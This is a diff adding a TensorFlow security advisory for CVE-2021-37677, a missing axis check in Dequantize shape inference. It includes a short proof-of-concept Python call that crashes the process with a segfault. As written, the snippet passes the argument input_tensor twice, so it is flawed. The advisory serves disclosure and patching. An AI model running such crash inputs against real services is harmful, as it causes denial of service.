@@ -1,0 +1,39 @@
+<h2>TFSA-2021-151: Missing validation in shape inference for <code>Dequantize</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-37677</p>
+<h3>Impact</h3>
+<p>The shape inference code for <code>tf.raw_ops.Dequantize</code> has a vulnerability that
+could trigger a denial of service via a segfault if an attacker provides invalid
+arguments:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>tf.compat.v1.disable_v2_behavior()
+tf.raw_ops.Dequantize(
+  input_tensor = tf.constant(-10.0, dtype=tf.float32),
+  input_tensor = tf.cast(input_tensor, dtype=tf.quint8),
+  min_range = tf.constant([], shape=[0], dtype=tf.float32),
+  max_range = tf.constant([], shape=[0], dtype=tf.float32),
+  mode  = 'MIN_COMBINED',
+  narrow_range=False,
+  axis=-10,
+  dtype=tf.dtypes.float32)
+```</p>
+<p>The shape inference
+<a href="https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/array_ops.cc#L2999-L3014">implementation</a>
+uses <code>axis</code> to select between two different values for <code>minmax_rank</code> which is
+then used to retrieve tensor dimensions. However, code assumes that <code>axis</code> can
+be either <code>-1</code> or a value greater than <code>-1</code>, with no validation for the other
+values.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/da857cfa0fde8f79ad0afdbc94e88b5d4bbec764">da857cfa0fde8f79ad0afdbc94e88b5d4bbec764</a>.</p>
+<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
+commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
+also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
